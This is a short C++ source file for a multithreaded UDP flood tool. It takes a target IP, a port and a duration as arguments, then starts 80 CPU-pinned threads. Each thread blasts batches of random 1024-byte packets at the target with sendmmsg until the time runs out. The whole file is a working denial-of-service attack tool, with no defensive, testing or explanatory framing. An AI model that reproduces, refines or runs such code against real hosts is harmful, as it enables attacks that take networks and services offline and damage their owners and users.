#define _GNU_SOURCE
#include <iostream>
#include <vector>
#include <thread>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <ctime>
#include <sys/socket.h>
#include <sched.h>

using namespace std;

#define PACKET_SIZE 1024
#define VLEN 64             
#define THREAD_COUNT 80     

void attack(string ip, int port, int duration) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(rand() % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char buffers[VLEN][PACKET_SIZE];

    for (int i = 0; i < VLEN; i++) {
        for (int j = 0; j < PACKET_SIZE; j++) buffers[i][j] = (char)(rand() % 256);
        iovecs[i].iov_base = buffers[i];
        iovecs[i].iov_len = PACKET_SIZE;
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
    }

    time_t end = time(NULL) + duration;
    while (time(NULL) < end) {
        sendmmsg(sock, msgs, VLEN, 0);
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) return 1;
    srand(time(NULL));
    string ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    vector<thread> threads;
    for (int i = 0; i < THREAD_COUNT; i++) {
        threads.push_back(thread(attack, ip, port, duration));
    }
    for (auto &t : threads) t.join();
    return 0;
}